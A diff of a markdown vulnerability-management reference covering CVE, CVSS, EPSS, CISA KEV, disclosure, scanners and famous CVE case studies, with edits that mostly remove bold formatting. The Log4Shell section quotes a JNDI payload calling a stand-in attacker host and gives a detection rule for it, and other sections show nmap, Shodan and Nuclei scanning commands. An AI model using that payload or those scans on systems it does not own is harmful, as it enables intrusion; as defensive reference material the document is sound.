@@ -5,9 +5,9 @@
 
 | | |
 |---|---|
-| **Read this when** | Deciding which vulnerabilities to patch first, scoring a new CVE with CVSS v3.1 or v4.0, building automated CVE/EPSS/KEV enrichment pipelines |
-| **Start at** | [CVSS v3.1 Deep Dive](#_2-cvss-v31-deep-dive), [EPSS -- Exploit Prediction Scoring System](#_4-epss-exploit-prediction-scoring-system), [CISA KEV Catalog](#_5-cisa-kev-catalog) |
-| **Pairs with** | [CWE Reference](CWE_REFERENCE.md), [CTEM Reference](CTEM_REFERENCE.md), [Fuzzing & Vulnerability Research](FUZZING_VULNERABILITY_RESEARCH.md), [Exploit Development Reference](EXPLOIT_DEVELOPMENT_REFERENCE.md) |
+| Read this when | Deciding which vulnerabilities to patch first, scoring a new CVE with CVSS v3.1 or v4.0, building automated CVE/EPSS/KEV enrichment pipelines |
+| Start at | [CVSS v3.1 Deep Dive](#_2-cvss-v31-deep-dive), [EPSS -- Exploit Prediction Scoring System](#_4-epss-exploit-prediction-scoring-system), [CISA KEV Catalog](#_5-cisa-kev-catalog) |
+| Pairs with | [CWE Reference](CWE_REFERENCE.md), [CTEM Reference](CTEM_REFERENCE.md), [Fuzzing & Vulnerability Research](FUZZING_VULNERABILITY_RESEARCH.md), [Exploit Development Reference](EXPLOIT_DEVELOPMENT_REFERENCE.md) |
 
 ---
 
@@ -31,17 +31,17 @@
 The Common Vulnerabilities and Exposures (CVE) program was established in 1999
 by MITRE Corporation with initial funding from DARPA/NSF, now operated under
 CISA. The initial list had 321 entries; as of 2024 the program has published
-over **240,000+ CVE records** growing at ~25,000-30,000 new CVEs per year.
+over 240,000+ CVE records growing at ~25,000-30,000 new CVEs per year.
 CVE provides a standardized identifier allowing security tools, databases, and
 researchers to reference the same vulnerability unambiguously.
 
 ### CNA Hierarchy
 The CVE Numbering Authority (CNA) ecosystem is a federated hierarchy:
 
-**MITRE (Root CNA)** -- ultimate authority; assigns CVEs when no other CNA
+MITRE (Root CNA) -- ultimate authority; assigns CVEs when no other CNA
 covers the scope; operates cve.mitre.org and the CVE Services API.
 
-**Top-Level Root CNAs (TL-Root):**
+Top-Level Root CNAs (TL-Root):
 - CISA-ADP -- U.S. government systems; Authorized Data Publisher for SSVC enrichment
 - GitHub -- GitHub-hosted open source projects and ecosystems
 - Microsoft -- all Microsoft products, Azure, Microsoft 365
@@ -51,10 +51,10 @@ covers the scope; operates cve.mitre.org and the CVE Services API.
 - Oracle -- Oracle Database, Java SE/JDK, MySQL, WebLogic
 - Cisco -- Cisco IOS, NX-OS, ASA, network hardware, Webex
 
-**CNA-LR (CNA of Last Resort)** -- MITRE fills gaps for products outside any
+CNA-LR (CNA of Last Resort) -- MITRE fills gaps for products outside any
 CNA scope: novel products, independent researchers, EOL software.
 
-**Authorized Data Publishers (ADP)** -- not CNAs; authorized to add enrichment
+Authorized Data Publishers (ADP) -- not CNAs; authorized to add enrichment
 to existing CVE records. CISA-ADP adds SSVC decision-point data and
 exploitation status; other ADPs add CPE/CVSS data.
 
@@ -99,9 +99,9 @@ exploitation status; other ADPs add CPE/CVSS data.
     }
 
 ### CVE States
-- **RESERVED** -- ID assigned; details embargoed while patch is developed
-- **PUBLISHED** -- full details public in NVD/CVE.org (description, versions, CVSS)
-- **REJECTED** -- duplicate or erroneous; record retained with rejection note
+- RESERVED -- ID assigned; details embargoed while patch is developed
+- PUBLISHED -- full details public in NVD/CVE.org (description, versions, CVSS)
+- REJECTED -- duplicate or erroneous; record retained with rejection note
 
 ### NVD Enrichment Pipeline
 NVD (nvd.nist.gov) independently adds to each published CVE record:
@@ -150,7 +150,7 @@ NVD (nvd.nist.gov) independently adds to each published CVE record:
 | | Low | 0.22 |
 | | High | 0.56 |
 
-**Scope (S):**
+Scope (S):
 - Unchanged (U): exploited and impacted component are the same
 - Changed (C): exploitation causes impact on a different component/authority
   (VM escape, browser sandbox escape, SSRF to metadata service)
@@ -173,15 +173,15 @@ NVD (nvd.nist.gov) independently adds to each published CVE record:
 
     TemporalScore = Roundup(BaseScore * E * RL * RC)
 
-**Exploit Code Maturity (E):**
+Exploit Code Maturity (E):
 - Not Defined (X): 1.00 | Unproven (U): 0.91 | Proof-of-Concept (P): 0.94
 - Functional (F): 0.97 | High (H): 1.00
 
-**Remediation Level (RL):**
+Remediation Level (RL):
 - Not Defined (X): 1.00 | Official Fix (O): 0.95 | Temporary Fix (T): 0.96
 - Workaround (W): 0.97 | Unavailable (U): 1.00
 
-**Report Confidence (RC):**
+Report Confidence (RC):
 - Not Defined (X): 1.00 | Unknown (U): 0.92 | Reasonable (R): 0.96
 - Confirmed (C): 1.00
 
@@ -232,16 +232,16 @@ Officially published by FIRST on November 1, 2023 (previewed June 2023 at the 35
 
 ### New and Changed Base Metrics
 
-**Attack Requirements (AT)** -- NEW: environmental prerequisites beyond attacker control
+Attack Requirements (AT) -- NEW: environmental prerequisites beyond attacker control
 - None (N): no special deployment conditions required
 - Present (P): specific config/deployment condition required
 
-**User Interaction (UI)** -- Expanded from binary:
+User Interaction (UI) -- Expanded from binary:
 - None (N): no user involvement
 - Passive (P): user takes routine action (opens email, visits page)
 - Active (A): user must take deliberate non-routine action (open file, install package)
 
-**Scope removed** -- Replaced by two-system impact model:
+Scope removed -- Replaced by two-system impact model:
 
 | Metric | Description |
 |--------|-------------|
@@ -295,8 +295,8 @@ EPSS (maintained by FIRST) answers: **"What is the probability this CVE will
 be exploited in the wild in the next 30 days?"**
 
 - Score: 0.000001 to 1.0 (probability)
-- Updated **daily** at api.first.org
-- **EPSS v4 (current, March 2025)**: developed by Jay Jacobs / Empirical Security with the Cyentia Institute, published by FIRST. Vastly improved data ingestion and monitoring; expands exploitation tracking to malware activity + endpoint detections (~12K vulnerabilities/month). Not directly comparable to v3.
+- Updated daily at api.first.org
+- EPSS v4 (current, March 2025): developed by Jay Jacobs / Empirical Security with the Cyentia Institute, published by FIRST. Vastly improved data ingestion and monitoring; expands exploitation tracking to malware activity + endpoint detections (~12K vulnerabilities/month). Not directly comparable to v3.
 - EPSS v3 (Feb 2023, superseded): ~1,500 features; accuracy degraded slightly over 2023-2024, prompting v4
 
 ### EPSS Model Features (v3 signals, expanded in v4)
@@ -335,7 +335,7 @@ Python bulk query:
 
 ### Score Interpretation
 
-Only **5-7% of all published CVEs** are ever exploited. EPSS identifies which.
+Only 5-7% of all published CVEs are ever exploited. EPSS identifies which.
 
 | EPSS Score | Interpretation | Action |
 |------------|---------------|----|
@@ -364,10 +364,10 @@ Only **5-7% of all published CVEs** are ever exploited. EPSS identifies which.
 ## 5. CISA KEV Catalog
 
 ### Legal Authority
-**BOD 26-04** (June 10, 2026): Federal Civilian Executive Branch (FCEB)
+BOD 26-04 (June 10, 2026): Federal Civilian Executive Branch (FCEB)
 agencies must remediate KEV entries within risk-based deadlines (from 3 days
 with mandatory forensic triage down to fix-on-upgrade, set by four risk
-factors). It superseded and revoked **BOD 22-01** (November 3, 2021), which
+factors). It superseded and revoked BOD 22-01 (November 3, 2021), which
 had set a flat per-entry deadline (typically 14 days); the KEV catalog and its
 criteria carry forward. CISA recommends all organizations use KEV for prioritization.
 
@@ -602,7 +602,7 @@ _Prior edition (2023 Top 25, for crosswalk): #1 CWE-787, #2 CWE-79, #3 CWE-89, #
 
 ### Finding Vulnerabilities
 
-**Fuzzing:**
+Fuzzing:
 
     # AFL++ -- coverage-guided greybox fuzzer
     afl-fuzz -i corpus/ -o findings/ -- ./target @@
@@ -616,7 +616,7 @@ _Prior edition (2023 Top 25, for crosswalk): #1 CWE-787, #2 CWE-79, #3 CWE-89, #
     # OSS-Fuzz: Google's continuous fuzzing for 1000+ open source projects
     # Submit via https://github.com/google/oss-fuzz for free 24/7 fuzzing
 
-**Static Analysis / CodeQL:**
+Static Analysis / CodeQL:
 
     # Create database
     codeql database create mydb --language=javascript --source-root=./src
@@ -624,7 +624,7 @@ _Prior edition (2023 Top 25, for crosswalk): #1 CWE-787, #2 CWE-79, #3 CWE-89, #
     # Run security queries
     codeql database analyze mydb codeql/javascript-queries:Security/       --format=sarif-latest --output=results.sarif
 
-**Memory Safety Sanitizers:**
+Memory Safety Sanitizers:
 
     clang -fsanitize=address,undefined -g -O1 -o target target.c
     # ASan: buffer overflows, use-after-free, double-free
@@ -635,7 +635,7 @@ _Prior edition (2023 Top 25, for crosswalk): #1 CWE-787, #2 CWE-79, #3 CWE-89, #
 
     valgrind --leak-check=full --track-origins=yes ./target  # no recompile needed
 
-**Patch Diffing (N-day research):**
+Patch Diffing (N-day research):
 
     # Open source: find security commits
     git log --oneline --no-merges -- '*.c' | grep -i "fix\|vuln\|secur"
@@ -646,13 +646,13 @@ _Prior edition (2023 Top 25, for crosswalk): #1 CWE-787, #2 CWE-79, #3 CWE-89, #
 
 ### Responsible Disclosure
 
-**Find vendor contact:**
+Find vendor contact:
 
-    curl https://target.com/.well-known/security.txt  # RFC 9116 standard
+    curl https://target.com/.well-known/security.txt # RFC 9116 standard
     # Try: security@, psirt@, vulnerability@vendor.com
     # Check HackerOne/Bugcrowd program directories
 
-**Disclosure timelines:**
+Disclosure timelines:
 
 | Organization | Window | Notes |
 |---|---|---|
@@ -661,7 +661,7 @@ _Prior edition (2023 Top 25, for crosswalk): #1 CWE-787, #2 CWE-79, #3 CWE-89, #
 | CERT/CC | 45 days | Multi-vendor coordination |
 | ISO/IEC 29147 | 90 days | International standard |
 
-**If vendor unresponsive:**
+If vendor unresponsive:
 1. Day 7: Follow-up same thread
 2. Day 14: Notify escalation to CERT/CC
 3. Day 21: Contact kb.cert.org/vuls/report/
@@ -711,16 +711,16 @@ Platforms: HackerOne, Bugcrowd, Intigriti, Synack (invite-only), YesWeHack
 
 ### Scanner Output
 
-**Tenable Nessus:**
+Tenable Nessus:
 - Plugin ID: unique check identifier
 - CVSS: NVD-sourced base score
 - VPR (Vulnerability Priority Rating): 0-10; combines CVSS + threat intel + asset criticality
   - VPR >= 9: patch within 24h; VPR 7-9: 7 days; VPR < 4: normal cycle
 
-**Qualys VMDR RTI Flags:**
+Qualys VMDR RTI Flags:
 - Active_Attacks, Wormable, No_Patch, Easy_Exploit, High_Lateral_Movement, CISA_KEV
 
-**Open Source Scanners:**
+Open Source Scanners:
 
     # Trivy
     trivy image nginx:latest --severity CRITICAL,HIGH
@@ -765,9 +765,9 @@ Approval matrix:
 
 ### SCAP -- Security Content Automation Protocol
 
-- **OVAL**: XML-based check definitions; verify patch status without exploitation
-- **XCCDF**: Benchmark format (DISA STIGs, CIS Benchmarks)
-- **CPE**: Standardized product naming for software inventory matching
+- OVAL: XML-based check definitions; verify patch status without exploitation
+- XCCDF: Benchmark format (DISA STIGs, CIS Benchmarks)
+- CPE: Standardized product naming for software inventory matching
 
 Commands:
 
@@ -789,16 +789,16 @@ Commands:
 
 ### CVE-2021-44228 -- Log4Shell
 
-**Affected**: Apache Log4j 2.x (2.0-beta9 through 2.14.1)
-**CVSS**: 10.0 CRITICAL | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-**CWE**: CWE-502 (Deserialization) / CWE-917 (Expression Language Injection)
-**Disclosed**: December 9, 2021 | **Exploited**: Within hours
+Affected: Apache Log4j 2.x (2.0-beta9 through 2.14.1)
+CVSS: 10.0 CRITICAL | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+CWE: CWE-502 (Deserialization) / CWE-917 (Expression Language Injection)
+Disclosed: December 9, 2021 | Exploited: Within hours
 
-**Root cause**: Log4j processed JNDI expressions (e.g., `${jndi:ldap://attacker.com/a}`)
+Root cause: Log4j processed JNDI expressions (e.g., `${jndi:ldap://attacker.com/a}`)
 embedded in any logged string -- HTTP User-Agent, username, API parameters.
 The JNDI lookup fetched and executed an attacker-controlled Java class.
 
-**Detection:**
+Detection:
 
     # Suricata IDS rule
     alert http any any -> any any (msg:"Log4Shell"; content:"${jndi:"; nocase; sid:2034647;)
@@ -809,30 +809,30 @@ The JNDI lookup fetched and executed an attacker-controlled Java class.
     # Scan for active exploitation attempts in logs
     grep -ri '${jndi:' /var/log/
 
-**Patch path**: 2.15.0 (partial) -> 2.16.0 (JNDI disabled by default, CVE-2021-45046 fixed) ->
+Patch path: 2.15.0 (partial) -> 2.16.0 (JNDI disabled by default, CVE-2021-45046 fixed) ->
 2.17.0 (CVE-2021-45105 DoS fixed) -> 2.17.1 (CVE-2021-44832 config-file RCE fixed)
 
-**Scale**: Hundreds of millions of affected systems; exploited within hours by
+Scale: Hundreds of millions of affected systems; exploited within hours by
 nation-state APTs (Hafnium, APT41), ransomware groups, and cryptominers.
 
 ---
 
 ### CVE-2017-0144 -- EternalBlue (MS17-010)
 
-**Affected**: Windows XP through Server 2016 (SMBv1)
-**CVSS v2**: 8.1 HIGH (practical severity ~10.0; wormable)
-**CWE**: CWE-119 (Improper Memory Restriction)
-**Origin**: NSA ETERNALBLUE leaked by Shadow Brokers, April 14, 2017
-**Patched**: March 14, 2017 (MS17-010) -- one month before leak
+Affected: Windows XP through Server 2016 (SMBv1)
+CVSS v2: 8.1 HIGH (practical severity ~10.0; wormable)
+CWE: CWE-119 (Improper Memory Restriction)
+Origin: NSA ETERNALBLUE leaked by Shadow Brokers, April 14, 2017
+Patched: March 14, 2017 (MS17-010) -- one month before leak
 
-**Root cause**: Buffer overflow in Windows SMBv1 server (srv.sys) transaction
+Root cause: Buffer overflow in Windows SMBv1 server (srv.sys) transaction
 handling. Unauthenticated SYSTEM-level RCE via TCP/445. Wormable.
 
-**Aftermath:**
+Aftermath:
 - WannaCry (May 2017): 200,000+ systems, 150 countries, $4-8B damage, NHS offline
 - NotPetya (June 2017): $10B+ damage, Maersk/Merck/FedEx devastated; GRU Sandworm
 
-**Commands:**
+Commands:
 
     nmap -p 445 --script smb-vuln-ms17-010 <target>
 
@@ -843,70 +843,70 @@ handling. Unauthenticated SYSTEM-level RCE via TCP/445. Wormable.
 
 ### CVE-2023-34362 -- MOVEit Transfer SQL Injection
 
-**Affected**: Progress MOVEit Transfer (all versions, pre-June 2023 patches)
-**CVSS**: 9.8 CRITICAL | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
-**CWE**: CWE-89 (SQL Injection)
-**Exploited by**: Cl0p (TA505) ransomware group, May-June 2023 as 0-day
+Affected: Progress MOVEit Transfer (all versions, pre-June 2023 patches)
+CVSS: 9.8 CRITICAL | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+CWE: CWE-89 (SQL Injection)
+Exploited by: Cl0p (TA505) ransomware group, May-June 2023 as 0-day
 
-**Technical**: SQL injection via HTTP POST to /human.aspx. Cl0p deployed
+Technical: SQL injection via HTTP POST to /human.aspx. Cl0p deployed
 LEMURLOOT webshell, exfiltrated all stored files. No authentication required.
 
-**Impact**: 2,500+ organizations -- US DOE/USDA, PBI Research (900,000 SSA records),
+Impact: 2,500+ organizations -- US DOE/USDA, PBI Research (900,000 SSA records),
 Zellis UK payroll (BBC/BA/Boots), universities, government agencies.
 
-**Lesson**: Silent 0-day exploitation for ~4 weeks before vendor awareness.
+Lesson: Silent 0-day exploitation for ~4 weeks before vendor awareness.
 Pure data-theft extortion model (no encryption). Supply chain via file transfer infrastructure.
 
 ---
 
 ### CVE-2014-0160 -- Heartbleed
 
-**Affected**: OpenSSL 1.0.1 through 1.0.1f, 1.0.2-beta
-**CVSS v2**: 5.0 MEDIUM (severely understated impact)
-**CWE**: CWE-125 (Out-of-bounds Read)
-**Disclosed**: April 7, 2014 | **Exposure window**: 2 years (since OpenSSL 1.0.1, March 2012)
+Affected: OpenSSL 1.0.1 through 1.0.1f, 1.0.2-beta
+CVSS v2: 5.0 MEDIUM (severely understated impact)
+CWE: CWE-125 (Out-of-bounds Read)
+Disclosed: April 7, 2014 | Exposure window: 2 years (since OpenSSL 1.0.1, March 2012)
 
-**Technical**: TLS heartbeat extension (RFC 6520) allowed arbitrary memory reads
+Technical: TLS heartbeat extension (RFC 6520) allowed arbitrary memory reads
 of up to 64KB per request by specifying a payload length larger than the actual
 payload. No authentication, no log trace.
 
-**Exposed**: Server private TLS keys (enables passive decryption of all traffic),
+Exposed: Server private TLS keys (enables passive decryption of all traffic),
 session tokens, cleartext passwords of active users.
 
-**Scale**: ~17-25% of global HTTPS servers affected; required emergency mass
+Scale: ~17-25% of global HTTPS servers affected; required emergency mass
 certificate revocation and reissuance.
 
 ---
 
 ### CVE-2020-1472 -- ZeroLogon
 
-**Affected**: Windows Server (Netlogon / MS-NRPC)
-**CVSS**: 10.0 CRITICAL | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-**CWE**: CWE-330 (Use of Insufficiently Random Values)
-**Discovered**: Tom Tervoort, Secura, August 2020
+Affected: Windows Server (Netlogon / MS-NRPC)
+CVSS: 10.0 CRITICAL | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+CWE: CWE-330 (Use of Insufficiently Random Values)
+Discovered: Tom Tervoort, Secura, August 2020
 
-**Technical**: Netlogon AES-CFB8 session key establishment with all-zero IV.
+Technical: Netlogon AES-CFB8 session key establishment with all-zero IV.
 AES-CFB8 with zero IV has 1/256 probability of producing all-zero ciphertext
 from zero plaintext. ~256 attempts achieve authentication as any machine account
 (including domain controller) without knowing credentials. Full domain admin in ~3 seconds.
 
-**Patch timeline**: Phase 1 (Aug 2020): optional enforcement; Phase 2 (Feb 2021):
+Patch timeline: Phase 1 (Aug 2020): optional enforcement; Phase 2 (Feb 2021):
 mandatory. Microsoft delayed 6 months for legacy device compatibility.
 
 ---
 
 ### CVE-2023-4966 -- CitrixBleed
 
-**Affected**: Citrix NetScaler ADC and Gateway
-**CVSS**: 9.4 CRITICAL | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
-**CWE**: CWE-125 (Out-of-bounds Read)
-**Exploited**: 0-day before patch; mass exploitation November 2023
+Affected: Citrix NetScaler ADC and Gateway
+CVSS: 9.4 CRITICAL | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+CWE: CWE-125 (Out-of-bounds Read)
+Exploited: 0-day before patch; mass exploitation November 2023
 
-**Technical**: Buffer over-read in NetScaler HTTP header processing leaked valid
+Technical: Buffer over-read in NetScaler HTTP header processing leaked valid
 session tokens from memory. Unauthenticated attackers bypassed authentication
 AND MFA by replaying stolen tokens. No interception of traffic required.
 
-**Notable**: LockBit 3.0 affiliate exploited CitrixBleed in Boeing breach (Nov 2023,
+Notable: LockBit 3.0 affiliate exploited CitrixBleed in Boeing breach (Nov 2023,
 ~45GB exfiltrated). Thousands of appliances remained unpatched weeks after the
 Oct 10, 2023 patch release due to slow enterprise edge infrastructure patching.
 
@@ -1025,15 +1025,15 @@ Oct 10, 2023 patch release due to slow enterprise edge infrastructure patching.
 
 ### Open Source VM Platforms
 
-**DefectDojo** (github.com/DefectDojo/django-DefectDojo):
+DefectDojo (github.com/DefectDojo/django-DefectDojo):
 
     # Import scanner results (100+ formats supported)
-    curl -X POST https://defectdojo.example.com/api/v2/import-scan/       -H "Authorization: Token $TOKEN"       -F "scan_type=Trivy Scan" -F "file=@trivy.json"       -F "product_name=My App" -F "engagement_name=Sprint-42"
+    curl -X POST https://defectdojo.example.com/api/v2/import-scan/ -H "Authorization: Token $TOKEN" -F "scan_type=Trivy Scan" -F "file=@trivy.json" -F "product_name=My App" -F "engagement_name=Sprint-42"
 
-**Dependency-Track** (github.com/DependencyTrack/dependency-track):
+Dependency-Track (github.com/DependencyTrack/dependency-track):
 
     # Upload SBOM for continuous tracking
-    curl -X PUT https://dtrack.example.com/api/v1/bom       -H "X-Api-Key: $DT_KEY"       -F "projectName=My App" -F "projectVersion=2.1.0"       -F "autoCreate=true" -F "bom=@sbom.cdx.json"
+    curl -X PUT https://dtrack.example.com/api/v1/bom -H "X-Api-Key: $DT_KEY" -F "projectName=My App" -F "projectVersion=2.1.0" -F "autoCreate=true" -F "bom=@sbom.cdx.json"
 
 ### CI/CD Security Scanning
 
@@ -1056,12 +1056,12 @@ Oct 10, 2023 patch release due to slow enterprise edge infrastructure patching.
 
 ### Threat Intelligence Tools
 
-**Shodan CVE search:**
+Shodan CVE search:
 
     shodan count "vuln:CVE-2021-44228"
     shodan search "vuln:CVE-2021-44228" --fields ip_str,port,org,country_code
 
-**Nuclei CVE templates:**
+Nuclei CVE templates:
 
     nuclei -t cves/ -u https://target.com -severity critical,high -o results.json
     nuclei -t cves/2021/CVE-2021-44228.yaml -u https://target.com
